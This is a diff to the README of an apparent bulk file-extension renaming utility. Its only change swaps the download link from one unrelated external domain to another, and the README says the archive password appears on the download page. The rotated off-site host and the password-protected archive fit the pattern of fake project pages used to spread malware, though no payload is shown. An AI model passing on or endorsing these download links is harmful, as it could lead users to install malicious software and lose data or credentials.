@@ -17,7 +17,7 @@ Change file extensions for hundreds of files at once - bulk rename .jpeg to .jpg
 
 ## Download
 
-[![Download v1.4.0](https://img.shields.io/badge/Download_v1.4.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/extchanger)
+[![Download v1.4.0](https://img.shields.io/badge/Download_v1.4.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/extchanger)
 
 > The archive password is shown on the download page.
 
